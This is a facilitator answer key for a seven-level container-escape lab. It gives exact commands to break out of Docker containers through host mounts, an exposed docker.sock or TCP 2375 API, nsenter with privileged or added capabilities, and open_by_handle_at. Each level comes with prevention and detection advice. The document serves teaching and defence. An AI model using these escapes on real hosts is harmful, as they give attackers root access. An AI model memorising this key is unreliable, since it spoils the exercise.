# Solutions and answer key (facilitators)

> Spoilers below. This is the full walkthrough.
> The flags are generated fresh on every `./lab.sh up`, so the exact
> `ESD26{...}` strings are different each run. The answers of the current run are
> in `.build/answers`.

For every level the goal is: escape the container and read `/flags/levelN.txt` on
the victim host. Below is the exact escape, why it works, and how to detect or
prevent it.

---

## Level 1 — Host path mounted in (`-v /:/mnt/host:ro`)

```bash
cat /mnt/host/flags/level1.txt
```

**Why it works:** the whole host filesystem is mounted into the container, so the
files can just be read. There is no real escape needed here, the separation was
never there in the first place.

**Detect / prevent:** check your volume mounts, never mount `/`, `/etc`, `/root`,
`/var/run`. Mount the smallest path you need, read-only. `docker-bench-security`
and Trivy config scanning point out sensitive mounts.

---

## Level 2 — Mounted Docker socket (`-v /var/run/docker.sock`)

```bash
docker -H unix:///var/run/docker.sock run --rm -v /:/host vuln:latest \
  cat /host/flags/level2.txt
```

**Why it works:** the Docker socket is the control channel of the engine, and the
engine runs as root. Anyone who can talk to it can start a new container that
mounts the host and runs as root. Having `docker.sock` is the same as having root
on the host.

**Detect / prevent:** do not mount the socket. If a workload really must control
Docker, use a hardened socket proxy (Tecnativa `docker-socket-proxy`) with a
minimal allow-list, rootless Docker, or Sysbox. Falco has a rule for containers
that start containers through the socket.

---

## Level 3 — Docker API open on TCP :2375

```bash
GW=$(ip route | awk '/default/{print $3}')
docker -H tcp://$GW:2375 run --rm -v /:/host vuln:latest \
  cat /host/flags/level3.txt
```

**Why it works:** same power as Level 2, just reached over the network. The lab
opens the engine with `socat TCP-LISTEN:2375 → unix:///var/run/docker.sock` (see
`lab/host/scripts/levels.conf`, `level_setup`). From inside a container the
default gateway is the host.

**Detect / prevent:** never open `2375` (plain text) at all. For remote access use
`2376` with mutual TLS and a firewall, or SSH with `DOCKER_HOST=ssh://`. Scanners
like Shodan and masscan find open `2375` all the time.

---

## Level 4 — `--privileged --pid=host`

```bash
# read the flag:
nsenter -t 1 -m -u -i -n -p -- cat /flags/level4.txt
# or a full host shell:
nsenter -t 1 -m -u -i -n -p -- bash
```

**Why it works:** `--privileged` gives all capabilities and removes the seccomp
and AppArmor protection. `--pid=host` shares the host process space, so PID 1 is
visible. `nsenter -t 1` joins the namespaces of PID 1 (`-m` mount, `-u` UTS, `-i`
IPC, `-n` network, `-p` PID), which puts you on the host as root.

**Detect / prevent:** forbid `--privileged` (Kubernetes: `privileged: false`, Pod
Security Standards "restricted"). Do not share host namespaces. Falco/Tetragon can
alert on `nsenter`/`setns` from a container.

---

## Level 5 — Only capabilities, no `--privileged`
(`--cap-add=SYS_ADMIN --cap-add=SYS_PTRACE --pid=host`)

```bash
nsenter -t 1 -m -u -i -n -p -- cat /flags/level5.txt
```

**Why it works:** `CAP_SYS_ADMIN` allows jumping into another mount namespace with
`setns()`, and `CAP_SYS_PTRACE` allows looking into other processes'
`/proc/<pid>/ns/*`. Together with `--pid=host` that is everything `nsenter` needs,
and no `--privileged` is required. That is the main point of this level: the
danger is the capabilities, not the label.

> Teaching note: `SYS_ADMIN` alone is not enough for the `nsenter` route, because
> opening `/proc/1/ns/*` needs ptrace access to a more privileged PID 1, so
> `SYS_PTRACE` is added. A nice moment to show that the two capabilities map
> directly onto the two kernel checks (`setns` needs `SYS_ADMIN`;
> `ptrace_may_access` needs `SYS_PTRACE`).

**Detect / prevent:** `--cap-drop=ALL` and add back only what is needed. Treat
`SYS_ADMIN` as the same as root. Keep seccomp on, it blocks many capability
tricks.

---

## Level 6 — Engine API reachable from a normal container (CVE-2025-9074)

The container is on purpose *not* set up wrong: normal `player` user, no mounts,
no capabilities, no shared namespaces. The hole is the engine API that can be
reached without a login (the lab opens it with the same
`socat TCP-LISTEN:2375 → docker.sock` as Level 3; see `levels.conf`
`_expose_engine_api`). Close to the real proof of concept, with plain HTTP:

```bash
GW=$(ip route | awk '/default/{print $3}')
API="http://$GW:2375"
cid=$(curl -s -XPOST "$API/containers/create" -H 'Content-Type: application/json' \
  -d '{"Image":"vuln:latest","Cmd":["cat","/host/flags/level6.txt"],
       "HostConfig":{"Binds":["/:/host:ro"]}}' | jq -r .Id)
curl -s -XPOST "$API/containers/$cid/start"; sleep 1
curl -s "$API/containers/$cid/logs?stdout=1&stderr=1" | strings
# short way (same thing):
# docker -H tcp://$GW:2375 run --rm -v /:/host vuln:latest cat /host/flags/level6.txt
```

**Why it works:** the engine API is as powerful as root. In the real CVE-2025-9074
(Docker Desktop below 4.44.3, score 9.3, found by Felix Boulet) it was reachable
at `192.168.65.7:2375` from any container with no login, even with Enhanced
Container Isolation on, so a `curl` or an SSRF in a hacked app took the host.

**Detect / prevent:** update Docker Desktop and the engine, never bind the API to
an address others can reach, and require mutual TLS if you really need remote
access. "The container had no permissions" does not help when the control channel
is open. The container's own hardening does not matter here, this is a platform
bug.

---

## Level 7 — One permission: CAP_DAC_READ_SEARCH (`open_by_handle_at`)
(`--cap-drop=ALL --cap-add=DAC_READ_SEARCH -v /srv/level7/share:/share:ro`)

```bash
handle-read                 # defaults: /share, secret.txt, inode 2, gen 0
# written out: handle-read /share secret.txt 2 0
```

**Why it works:** `CAP_DAC_READ_SEARCH` lets you ignore the normal file read
checks, and it is also the permission the kernel requires for `open_by_handle_at(2)`.
That system call opens a file from a raw `{inode, generation}` handle, ignoring in
which folder it is or whether that folder was mounted in. The lab builds a small
self-contained loopback ext4 disk at `/srv/level7` (see `levels.conf`
`_build_level7_disk`): the flag sits at the root of that disk as `secret.txt`, and
only the subfolder `share/` is mounted into the container. The helper opens
`/share` (one spot on that disk), asks for a handle to inode 2 (the root of any
ext2/3/4 disk), and walks to `secret.txt`, a neighbour of the mount that was never
given to it. This is the classic "shocker" trick.

> Teaching note: this is why the loop disk matters. The root of an ext4 disk is
> always inode 2, so the handle is reliable, and the whole escape stays inside a
> 16 MB disk image, so it can never reach the real machine. Same safety as every
> other level.

**Detect / prevent:** `--cap-drop=ALL`, and treat `DAC_READ_SEARCH` (and
`DAC_OVERRIDE`, `SYS_ADMIN`) as almost root, do not add them "just to read a
file". Keep untrusted workloads on their own disk, so one read permission cannot
reach the neighbour data. seccomp can block `open_by_handle_at` completely
(Docker's default profile does not, it is allowed when the capability is there).

---

## Bonus: show how attackers find these holes (optional, any level)

Inside a level you can show how attackers find these holes automatically:

```bash
# quick manual look
capsh --print 2>/dev/null; grep Cap /proc/self/status; mount | grep -i host
# or use a tool like deepce / amicontained (offline copy if there is no internet)
```

## Resetting between groups

```bash
./lab.sh reset <n>     # rebuild one level
./lab.sh down && ./lab.sh up   # wipe everything, fresh flags
```
